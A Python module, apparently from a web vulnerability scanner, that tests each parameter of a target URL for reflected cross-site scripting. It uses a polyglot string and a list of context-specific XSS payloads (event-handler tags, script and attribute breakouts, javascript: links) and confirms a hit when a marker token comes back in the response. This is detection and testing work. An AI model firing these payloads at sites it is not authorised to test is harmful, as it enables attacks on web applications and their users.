import re
import time

POLYGLOT = '"""--></style></script><svg onload="KR_XSS_CONFIRMED"><!--'

CONTEXT_DETECT_RE = re.compile(
    r'(<script[^>]*>)(.*?)KR_XSS_CONFIRMED(.*?)</script>',
    re.IGNORECASE | re.DOTALL
)

HREF_DETECT_RE = re.compile(
    r'href=["\'][^"\']*KR_XSS_CONFIRMED',
    re.IGNORECASE
)

CONTEXT_PAYLOADS = {
    "html": [
        {"name": "img_onerror", "payload": '<img src=x onerror=KR_XSS_CONFIRMED>'},
        {"name": "svg_onload", "payload": '<svg onload=KR_XSS_CONFIRMED>'},
        {"name": "body_onload", "payload": '<body onload=KR_XSS_CONFIRMED>'},
        {"name": "iframe_srcdoc", "payload": "<iframe srcdoc='KR_XSS_CONFIRMED'></iframe>"},
        {"name": "input_onfocus", "payload": '<input autofocus onfocus=KR_XSS_CONFIRMED>'},
        {"name": "details_ontoggle", "payload": '<details open ontoggle=KR_XSS_CONFIRMED>'},
    ],
    "script": [
        {"name": "script_breakout", "payload": "';KR_XSS_CONFIRMED;'"},
        {"name": "script_dash_breakout", "payload": "</script><script>KR_XSS_CONFIRMED</script>"},
        {"name": "script_json_breakout", "payload": "};KR_XSS_CONFIRMED;//"},
    ],
    "attribute": [
        {"name": "attr_breakout", "payload": '" autofocus onfocus=KR_XSS_CONFIRMED x="'},
        {"name": "attr_apos_breakout", "payload": "' onfocus=KR_XSS_CONFIRMED x='"},
    ],
    "href": [
        {"name": "href_javascript", "payload": "javascript:KR_XSS_CONFIRMED"},
    ],
}


def _detect_context(resp_text):
    if CONTEXT_DETECT_RE.search(resp_text):
        return "script"
    if HREF_DETECT_RE.search(resp_text):
        return "href"
    if "KR_XSS_CONFIRMED" in resp_text:
        return "html"
    return None


def xss_check(engine):
    engine._log("INFO", f"Starting XSS detection on {engine.target_url}")
    results = []

    params = engine.extract_params()
    if not params:
        engine._log("WARN", "No parameters found for XSS testing")
        return results

    for param in params:
        baseline_text = engine.get_baseline_text(param)
        if baseline_text is None:
            engine._log("WARN", f"Skipping '{param}' — baseline request failed")
            continue

        detected_context = None
        confirmed_payload = None

        polyglot_args = engine.build_request_args(param, POLYGLOT)
        polyglot_resp = engine.request(**polyglot_args)
        if polyglot_resp and "KR_XSS_CONFIRMED" in polyglot_resp.text:
            if not baseline_text or "KR_XSS_CONFIRMED" not in baseline_text:
                detected_context = _detect_context(polyglot_resp.text)
                engine._log("FOUND", f"XSS confirmed via polyglot in '{param}' — context: {detected_context or 'html'}")
                confirmed_payload = POLYGLOT

        if not confirmed_payload:
            context_list = ["html"]
            if detected_context:
                context_list = [detected_context] + [c for c in CONTEXT_PAYLOADS if c != detected_context]

            for ctx in context_list:
                if confirmed_payload:
                    break
                for entry in CONTEXT_PAYLOADS.get(ctx, []):
                    args = engine.build_request_args(param, entry["payload"])
                    resp = engine.request(**args)
                    if resp is None:
                        continue
                    resp_text = resp.text
                    if "KR_XSS_CONFIRMED" in resp_text:
                        if not baseline_text or "KR_XSS_CONFIRMED" not in baseline_text:
                            engine._log("VULN", f"XSS confirmed in '{param}' via {entry['name']} ({ctx} context)")
                            confirmed_payload = entry["payload"]
                            break

        if confirmed_payload:
            results.append({
                "parameter": param,
                "payload": confirmed_payload[:100],
                "context": detected_context or "html",
                "evidence": "unique_tag KR_XSS_CONFIRMED reflected (not in baseline)",
                "status": polyglot_resp.status_code if polyglot_resp else 200,
            })

    engine.results["xss"] = results
    engine._log("INFO", f"XSS detection complete. Confirmed: {len(results)}.")
    return results
